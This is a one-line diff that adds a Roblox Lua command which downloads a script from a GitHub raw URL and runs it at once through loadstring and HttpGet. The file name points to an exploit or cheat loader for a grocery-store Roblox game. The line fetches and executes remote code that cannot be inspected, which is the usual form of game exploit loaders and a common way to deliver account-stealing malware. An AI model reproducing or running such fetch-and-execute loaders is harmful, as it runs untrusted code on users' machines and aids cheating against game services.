@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/eat-everything-in-a-grocery-store-spam7-prbdl7rdh0jg8h.lua"))()
